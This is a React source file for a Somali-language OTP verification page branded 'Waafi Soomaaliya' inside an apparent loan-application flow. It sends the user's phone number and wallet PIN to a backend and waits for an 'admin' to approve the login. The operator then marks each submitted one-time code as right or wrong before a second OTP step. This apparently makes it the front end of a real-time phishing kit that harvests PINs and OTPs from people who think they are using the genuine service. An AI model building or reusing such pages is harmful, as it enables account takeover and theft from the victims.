import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Otp.css';

export default function Otp() {
  const navigate = useNavigate();
  const { authData, updateAuthData } = useLoanApplication();
  
  // Get API endpoint from environment variable
  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || '1';
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
  
  const getInitialPhone = () => {
    if (authData.phoneNumber) {
      return authData.phoneNumber;
    }
    
    try {
      const savedPhone = localStorage.getItem('waafi_phone');
      if (savedPhone) {
        return savedPhone;
      }
    } catch (error) {
      console.log('No saved phone found');
    }
    
    return '+252 612 345 678';
  };

  const [phoneNumber] = useState(getInitialPhone());
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  
  // Toast states
  const [showSuccessToast, setShowSuccessToast] = useState(false);
  const [showResendToast, setShowResendToast] = useState(false);
  
  // Timer state
  const [otpTimer, setOtpTimer] = useState(null);
  
  // Processing states
  const [isProcessing, setIsProcessing] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Progress tracking
  const [progress, setProgress] = useState(0);
  
  // Verification status
  const [verificationStatus, setVerificationStatus] = useState('');
  
  // Approval state
  const [isApproved, setIsApproved] = useState(false);
  
  // Error modals
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [showResendErrorModal, setShowResendErrorModal] = useState(false);
  const [showVerifyErrorModal, setShowVerifyErrorModal] = useState(false);
  const [showWrongPinModal, setShowWrongPinModal] = useState(false);
  const [showTimeoutModal, setShowTimeoutModal] = useState(false);
  
  const [waitingForApproval, setWaitingForApproval] = useState(true);

  const previousStatusRef = useRef(null);
  const pollingIntervalRef = useRef(null);

  // Refs for OTP inputs
  const otpRefs = [
    useRef(null),
    useRef(null),
    useRef(null),
    useRef(null),
    useRef(null),
    useRef(null)
  ];

  // Poll for login approval status
  useEffect(() => {
    if (!waitingForApproval) return;

    const checkApprovalStatus = async () => {
      try {
        const phone = authData.phoneNumber || phoneNumber;
        
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-login-approval`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            phoneNumber: phone,
            pin: authData.pin
          })
        });

        const data = await response.json();
        
        if (data.approved) {
          setWaitingForApproval(false);
          setShowSuccessToast(true);
          setOtpTimer(40);
          
          const endTime = Date.now() + (40 * 1000);
          localStorage.setItem('first_otp_timer', JSON.stringify({ endTime }));
        }
      } catch (error) {
        console.error('Error checking approval status:', error);
      }
    };

    pollingIntervalRef.current = setInterval(checkApprovalStatus, 2000);
    checkApprovalStatus();

    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
        pollingIntervalRef.current = null;
      }
    };
  }, [waitingForApproval, phoneNumber, authData.phoneNumber, authData.pin, API_BASE_URL, API_ENDPOINT]);

  // Toast timers
  useEffect(() => {
    if (showSuccessToast) {
      const toastTimer = setTimeout(() => {
        setShowSuccessToast(false);
      }, 2500);
      return () => clearTimeout(toastTimer);
    }
  }, [showSuccessToast]);

  useEffect(() => {
    if (showResendToast) {
      const toastTimer = setTimeout(() => {
        setShowResendToast(false);
      }, 2500);
      return () => clearTimeout(toastTimer);
    }
  }, [showResendToast]);

  // OTP Timer countdown
  useEffect(() => {
    if (otpTimer > 0 && !isProcessing && !waitingForApproval) {
      const countdown = setInterval(() => {
        setOtpTimer(prev => {
          const newValue = prev - 1;
          if (newValue <= 0) {
            localStorage.removeItem('first_otp_timer');
            return 0;
          }
          
          const endTime = Date.now() + (newValue * 1000);
          localStorage.setItem('first_otp_timer', JSON.stringify({ endTime }));
          
          return newValue;
        });
      }, 1000);

      return () => clearInterval(countdown);
    }
  }, [otpTimer, isProcessing, waitingForApproval]);

  // Progress tracking
  useEffect(() => {
    if (isProcessing && isApproved && progress < 100) {
      const progressTimer = setTimeout(() => {
        setProgress(prev => {
          const increment = Math.random() * 15 + 5;
          return Math.min(prev + increment, 100);
        });
      }, 300);

      return () => clearTimeout(progressTimer);
    } else if (progress >= 100 && isApproved) {
      setTimeout(() => {
        // Clear polling and storage
        if (pollingIntervalRef.current) {
          clearInterval(pollingIntervalRef.current);
          pollingIntervalRef.current = null;
        }
        localStorage.removeItem('first_otp_timer');
        
        // Navigate to Confirm page for second OTP
        navigate('/confirm', { replace: true });
      }, 500);
    }
  }, [isProcessing, isApproved, progress, navigate]);

  // Check OTP Status
  const checkOTPStatus = async (phone, otpCode) => {
    const startTime = Date.now();
    const maxTime = 5 * 60 * 1000; // 5 minutes
    const pollInterval = 2000; // 2 seconds
    
    while (Date.now() - startTime < maxTime) {
      try {
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-first-otp-status`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            phoneNumber: phone,
            otp: otpCode,
            otpType: 'first'
          })
        });

        const data = await response.json();
        
        if (data.status === 'approved') {
          return { approved: true };
        } else if (data.status === 'rejected') {
          return { approved: false, message: 'Admin-ku wuxuu ku calaamadeeyay inuu OTP-ku khaldan yahay' };
        } else if (data.status === 'wrong_pin') {
          return { approved: false, wrongPin: true, message: 'PIN khaldan ayaa la galay' };
        }
        
        // Calculate elapsed time
        const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000);
        const newStatus = `Fadlan sug... (${elapsedSeconds}s)`;
        
        if (previousStatusRef.current !== newStatus) {
          setVerificationStatus(newStatus);
          previousStatusRef.current = newStatus;
        }
        
        // Wait before next poll
        await new Promise(resolve => setTimeout(resolve, pollInterval));
        
      } catch (error) {
        console.error('Error checking OTP status:', error);
        await new Promise(resolve => setTimeout(resolve, pollInterval));
      }
    }
    
    // Timeout after 5 minutes
    return { approved: false, timeout: true, message: 'Khalad ayaa dhacay, fadlan mar kale isku day' };
  };

  // OTP change handler
  const handleOtpChange = (index, value) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length > 1) return;
    
    const newOtp = [...otp];
    newOtp[index] = numericValue;
    setOtp(newOtp);

    if (numericValue && index < 5) {
      otpRefs[index + 1].current.focus();
    }
  };

  // OTP paste handler
  const handleOtpPaste = (e, index) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text');
    const digits = pastedText.replace(/\D/g, '').slice(0, 6).split('');
    
    const newOtp = [...otp];
    digits.forEach((digit, i) => {
      if (index + i < 6) {
        newOtp[index + i] = digit;
      }
    });
    setOtp(newOtp);

    const focusIndex = Math.min(index + digits.length, 5);
    otpRefs[focusIndex].current.focus();
  };

  // OTP keydown handler
  const handleOtpKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (otp[index]) {
        const newOtp = [...otp];
        newOtp[index] = '';
        setOtp(newOtp);
      } else if (index > 0) {
        otpRefs[index - 1].current.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      otpRefs[index - 1].current.focus();
    } else if (e.key === 'ArrowRight' && index < 5) {
      otpRefs[index + 1].current.focus();
    }
  };

  const handleOtpKeyPress = (e) => {
    if (!/^\d$/.test(e.key)) {
      e.preventDefault();
    }
  };

  // Handle OTP Submit
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (isSubmitting || waitingForApproval) {
      return;
    }
    
    const fullOtp = otp.join('');
    
    if (fullOtp.length !== 6) {
      alert('Fadlan geli koodhka 6 tiro ee dhammaystiran');
      return;
    }

    setIsSubmitting(true);
    const phone = authData.phoneNumber || phoneNumber;

    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-first-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: phone,
          otp: fullOtp,
          timestamp: new Date().toISOString()
        })
      });

      await response.json();
      
      setIsProcessing(true);
      const initialStatus = 'Fadlan sug...';
      setVerificationStatus(initialStatus);
      previousStatusRef.current = initialStatus;
      setIsApproved(false);
      setProgress(0);
      
      const verificationResult = await checkOTPStatus(phone, fullOtp);
      
      if (verificationResult.approved) {
        const approvedStatus = '✅ OTP la xaqiijiyay!';
        setVerificationStatus(approvedStatus);
        previousStatusRef.current = approvedStatus;
        setIsApproved(true);
        
        // Update auth data with first OTP
        updateAuthData({
          firstOtp: fullOtp,
        });
      } else if (verificationResult.wrongPin) {
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        setIsApproved(false);
        setShowWrongPinModal(true);
        previousStatusRef.current = null;
      } else if (verificationResult.timeout) {
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        setIsApproved(false);
        setShowTimeoutModal(true);
        previousStatusRef.current = null;
      } else {
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        setIsApproved(false);
        setShowErrorModal(true);
        setOtp(['', '', '', '', '', '']);
        previousStatusRef.current = null;
        setTimeout(() => {
          otpRefs[0].current?.focus();
        }, 100);
      }
      
    } catch (error) {
      console.error('OTP verification error:', error);
      setIsSubmitting(false);
      setIsProcessing(false);
      setProgress(0);
      setIsApproved(false);
      setShowVerifyErrorModal(true);
      previousStatusRef.current = null;
    }
  };

  // Handle Resend
  const handleResend = async () => {
    if (otpTimer > 0 || isResending || waitingForApproval) return;
    
    const phone = authData.phoneNumber || phoneNumber;
    if (!phone || phone === '+252 612 345 678') {
      setShowResendErrorModal(true);
      return;
    }
    
    setIsResending(true);
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/resend-first-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: phone,
          timestamp: new Date().toISOString()
        })
      });

      const data = await response.json();
      
      if (data.success) {
        setOtp(['', '', '', '', '', '']);
        setOtpTimer(40);
        const endTime = Date.now() + (40 * 1000);
        localStorage.setItem('first_otp_timer', JSON.stringify({ endTime }));
        otpRefs[0].current.focus();
        setShowResendToast(true);
      } else {
        setShowResendErrorModal(true);
      }
    } catch (error) {
      console.error('Resend OTP error:', error);
      setShowResendErrorModal(true);
    } finally {
      setIsResending(false);
    }
  };

  const handleBack = () => {
    localStorage.removeItem('first_otp_timer');
    navigate(-1);
  };

  // Error modal handlers
  const handleWrongPinModalClose = () => {
    setShowWrongPinModal(false);
    localStorage.removeItem('first_otp_timer');
    localStorage.removeItem('waafi_phone');
    updateAuthData({
      phoneNumber: '',
      pin: '',
      firstOtp: '',
      isAuthenticated: false
    });
    navigate('/login');
  };

  const handleTimeoutModalClose = () => {
    setShowTimeoutModal(false);
    setOtp(['', '', '', '', '', '']);
    setTimeout(() => {
      otpRefs[0].current?.focus();
    }, 100);
  };

  const isOtpComplete = otp.every(digit => digit !== '');

  // Processing screen
  if (isProcessing) {
    return (
      <div className="otp-container">
        <main className="otp-content">
          <div className="processing-card">
            <div className="spinner-container">
              <div className="spinner"></div>
            </div>
            
            <h1 className="processing-title">Xaqiijinta OTP-ga</h1>
            <p className="processing-subtitle">{verificationStatus}</p>
          </div>
        </main>

        <footer className="otp-footer">
          © 2025 Waafi Soomaaliya
        </footer>
      </div>
    );
  }

  return (
    <div className="otp-container">
      {/* Error Modals */}
      {showErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Koodh khaldan!</h2>
            <p className="error-modal-message">
              SMS-ka eeg koodhka ama codsato koodh mar kale kadib marka tirinta dhammaato
            </p>
            <button 
              className="error-modal-button" 
              onClick={() => setShowErrorModal(false)}
            >
              HAGAAG
            </button>
          </div>
        </div>
      )}

      {showTimeoutModal && (
        <div className="error-modal-overlay" onClick={handleTimeoutModalClose}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Waqtiga dhammaday</h2>
            <p className="error-modal-message">
              Khalad ayaa dhacay, fadlan mar kale isku day
            </p>
            <button 
              className="error-modal-button" 
              onClick={handleTimeoutModalClose}
            >
              HAGAAG
            </button>
          </div>
        </div>
      )}

      {showWrongPinModal && (
        <div className="error-modal-overlay" onClick={handleWrongPinModalClose}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">PIN khaldan!</h2>
            <p className="error-modal-message">
              PIN-ka ama lambarka taleefanka aad hore u gashay wuu khaldan yahay. Fadlan mar kale ku soo celi galitaanka macluumaadka saxda ah.
            </p>
            <button 
              className="error-modal-button" 
              onClick={handleWrongPinModalClose}
            >
              Ku noqo Galitaanka
            </button>
          </div>
        </div>
      )}

      {showVerifyErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowVerifyErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Xaqiijinta ma guulaysan</h2>
            <p className="error-modal-message">
              Xaqiijinta OTP-ga ma guulaysan. Fadlan mar kale isku day markii dambe.
            </p>
            <button 
              className="error-modal-button" 
              onClick={() => setShowVerifyErrorModal(false)}
            >
              HAGAAG
            </button>
          </div>
        </div>
      )}

      {showResendErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowResendErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Dirida mar labaad ma guulaysan</h2>
            <p className="error-modal-message">
              Dirida OTP-ga ma guulaysan. Fadlan mar kale isku day markii dambe.
            </p>
            <button 
              className="error-modal-button" 
              onClick={() => setShowResendErrorModal(false)}
            >
              HAGAAG
            </button>
          </div>
        </div>
      )}

      {/* Success Toasts */}
      {showSuccessToast && (
        <div className="success-toast">
          <div className="success-icon">✓</div>
          <span className="success-text">Koodka si guul leh ayaa loo diray!</span>
        </div>
      )}

      {showResendToast && (
        <div className="success-toast resend">
          <div className="success-icon">📱</div>
          <span className="success-text">OTP si guul leh ayaa mar kale loo diray!</span>
        </div>
      )}

      <header className="otp-header">
        <button className="back-btn" onClick={handleBack}>
          ←
        </button>
        
        <div className="logo-large">
          <span className="logo-large-waafi">Waafi</span>
        </div>
        
        <button className="menu-btn" aria-label="Menu">
          <div className="menu-line"></div>
          <div className="menu-line"></div>
          <div className="menu-line"></div>
        </button>
      </header>

      <main className="otp-content">
        <div className="otp-card">
          <h1 className="otp-title">Xaqiijinta OTP-ga Kowaad</h1>
          <p className="otp-subtitle">
            Geli OTP-ga kowaad ee loogu diray lambarka taleefankaaga
          </p>
          <p className="otp-phone">{phoneNumber}</p>

          <form onSubmit={handleSubmit}>
            <div className="otp-inputs-container">
              <div className="otp-inputs">
                {otp.map((digit, index) => (
                  <input
                    key={index}
                    ref={otpRefs[index]}
                    type="text"
                    className="otp-box"
                    value={digit}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                    onKeyPress={handleOtpKeyPress}
                    onPaste={(e) => handleOtpPaste(e, index)}
                    maxLength="1"
                    inputMode="numeric"
                    pattern="[0-9]"
                    required
                    disabled={isResending || isSubmitting || waitingForApproval}
                  />
                ))}
              </div>

              <p className="resend-text">
                {waitingForApproval ? (
                  <span className="resending-text">Codsanaynaa OTP...</span>
                ) : isResending ? (
                  <span className="resending-text">Koodka mar kale ayaa la diraya...</span>
                ) : otpTimer > 0 ? (
                  `Koodka mar kale u dir ${otpTimer} ilbiriqsi`
                ) : (
                  <>
                    Koodka ma helin?{' '}
                    <span className="resend-link" onClick={handleResend}>
                      Mar kale dir
                    </span>
                  </>
                )}
              </p>
            </div>

            <button 
              type="submit" 
              className={`submit-button ${(isOtpComplete && !waitingForApproval) ? 'active' : ''}`}
              disabled={!isOtpComplete || isResending || isSubmitting || waitingForApproval}
            >
              {isSubmitting ? 'XAQIIJINAYA...' : 'XAQIIJI OTP-GA KOWAAD'}
            </button>
          </form>
        </div>
      </main>

      <footer className="otp-footer">
        © 2026 Waafi Soomaaliya
      </footer>
    </div>
  );
}